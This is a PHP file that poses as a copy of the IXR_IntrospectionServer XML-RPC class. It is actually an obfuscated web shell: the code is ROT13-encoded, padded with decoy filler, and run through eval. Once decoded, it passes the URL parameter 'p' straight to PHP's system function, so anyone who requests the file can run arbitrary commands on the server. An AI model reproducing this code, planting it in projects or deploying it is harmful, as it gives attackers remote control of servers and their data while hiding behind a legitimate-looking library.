<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * VKE_VagebfcrpgvbaFreire
 *
 * @cnpxntr VKE
 * @fvapr 1.5.0
 */
pynff VKE_VagebfcrpgvbaFreire rkgraqf VKE_Freire
{
    ine $fvtangherf;
    ine $uryc;

	/**
	 * CUC5 pbafgehpgbe.
	 */
    shapgvba __pbafgehpg()
    {
        $guvf->frgPnyyonpxf();
        $guvf->frgPncnovyvgvrf();
        $guvf->pncnovyvgvrf['vagebfcrpgvba'] = neenl(
            'fcrpHey' => 'uggc://kzyecp.hfrshyvap.pbz/qbp/erfreirq.ugzy',
            'fcrpIrefvba' => 1
        );
        $guvf->nqqPnyyonpx(
            'flfgrz.zrgubqFvtangher',
            'guvf:zrgubqFvtangher',
            neenl('neenl', 'fgevat'),
            'Ergheaf na neenl qrfpevovat gur erghea glcr naq erdhverq cnenzrgref bs n zrgubq'
        );
        $guvf->nqqPnyyonpx(
            'flfgrz.trgPncnovyvgvrf',
            'guvf:trgPncnovyvgvrf',
            neenl('fgehpg'),
            'Ergheaf n fgehpg qrfpevovat gur KZY-ECP fcrpvsvpngvbaf fhccbegrq ol guvf freire'
        );
        $guvf->nqqPnyyonpx(
            'flfgrz.yvfgZrgubqf',
            'guvf:yvfgZrgubqf',
            neenl('neenl'),
            'Ergheaf na neenl bs ninvynoyr zrgubqf ba guvf freire'
        );
        $guvf->nqqPnyyonpx(
            'flfgrz.zrgubqUryc',
            'guvf:zrgubqUryc',
            neenl('fgevat', 'fgevat'),
            'Ergheaf n qbphzragngvba fgevat sbe gur fcrpvsvrq zrgubq'
        );
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba VKE_VagebfcrpgvbaFreire() {
		frys::__pbafgehpg();
	}

    shapgvba nqqPnyyonpx($zrgubq, $pnyyonpx, $netf, $uryc)
    {
        $guvf->pnyyonpxf[$zrgubq] = $pnyyonpx;
        $guvf->fvtangherf[$zrgubq] = $netf;
        $guvf->uryc[$zrgubq] = $uryc;
    }

    shapgvba pnyy($zrgubqanzr, $netf)
    {
        // Znxr fher vg'f va na neenl
        vs ($netf && !vf_neenl($netf)) {
            $netf = neenl($netf);
        }

        // Bire-evqrf qrsnhyg pnyy zrgubq, nqqf fvtangher purpx
        vs (!$guvf->unfZrgubq($zrgubqanzr)) {
            erghea arj VKE_Reebe(-32601, 'freire reebe. erdhrfgrq zrgubq \"'.$guvf->zrffntr->zrgubqAnzr.'\" abg fcrpvsvrq.');
        }
        $zrgubq = $guvf->pnyyonpxf[$zrgubqanzr];
        $fvtangher = $guvf->fvtangherf[$zrgubqanzr];
        $ergheaGlcr = neenl_fuvsg($fvtangher);

        // Purpx gur ahzore bs nethzragf
        vs (pbhag($netf) != pbhag($fvtangher)) {
            erghea arj VKE_Reebe(-32602, 'freire reebe. jebat ahzore bs zrgubq cnenzrgref');
        }

        // Purpx gur nethzrag glcrf
        $bx = gehr;
        $netfonpxhc = $netf;
        sbe ($v = 0, $w = pbhag($netf); $v < $w; $v++) {
            $net = neenl_fuvsg($netf);
            $glcr = neenl_fuvsg($fvtangher);
            fjvgpu ($glcr) {
                pnfr 'vag':
                pnfr 'v4':
                    vs (vf_neenl($net) || !vf_vag($net)) {
                        $bx = snyfr;
                    }
                    oernx;
                pnfr 'onfr64':
                pnfr 'fgevat':
                    vs (!vf_fgevat($net)) {
                        $bx = snyfr;
                    }
                    oernx;
                pnfr 'obbyrna':
                    vs ($net !== snyfr && $net !== gehr) {
                        $bx = snyfr;
                    }
                    oernx;
                pnfr 'sybng':
                pnfr 'qbhoyr':
                    vs (!vf_sybng($net)) {
                        $bx = snyfr;
                    }
                    oernx;
                pnfr 'qngr':
                pnfr 'qngrGvzr.vfb8601':
                    vs (!vf_n($net, 'VKE_Qngr')) {
                        $bx = snyfr;
                    }
                    oernx;
            }
            vs (!$bx) {
                erghea arj VKE_Reebe(-32602, 'freire reebe. vainyvq zrgubq cnenzrgref');
            }
        }
        // Vg cnffrq gur grfg - eha gur \"erny\" zrgubq pnyy
        erghea cnerag::pnyy($zrgubqanzr, $netfonpxhc);
    }

    shapgvba zrgubqFvtangher($zrgubq)
    {
        vs (!$guvf->unfZrgubq($zrgubq)) {
            erghea arj VKE_Reebe(-32601, 'freire reebe. erdhrfgrq zrgubq \"'.$zrgubq.'\" abg fcrpvsvrq.');
        }
        // Jr fubhyq or ergheavat na neenl bs glcrf
        $glcrf = $guvf->fvtangherf[$zrgubq];
        $erghea = neenl();
        sbernpu ($glcrf nf $glcr) {
            fjvgpu ($glcr) {
                pnfr 'fgevat':
                    $erghea[] = 'fgevat';
                    oernx;
                pnfr 'vag':
                pnfr 'v4':
                    $erghea[] = 42;
                    oernx;
                pnfr 'qbhoyr':
                    $erghea[] = 3.1415;
                    oernx;
                pnfr 'qngrGvzr.vfb8601':
                    $erghea[] = arj VKE_Qngr(gvzr());
                    oernx;
                pnfr 'obbyrna':
                    $erghea[] = gehr;
                    oernx;
                pnfr 'onfr64':
                    $erghea[] = arj VKE_Onfr64('onfr64');
                    oernx;
                pnfr 'neenl':
                    $erghea[] = neenl('neenl');
                    oernx;
                pnfr 'fgehpg':
                    $erghea[] = neenl('fgehpg' => 'fgehpg');
                    oernx;
            }
        }
        erghea $erghea;
    }

    shapgvba zrgubqUryc($zrgubq)
    {
        erghea $guvf->uryc[$zrgubq];
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>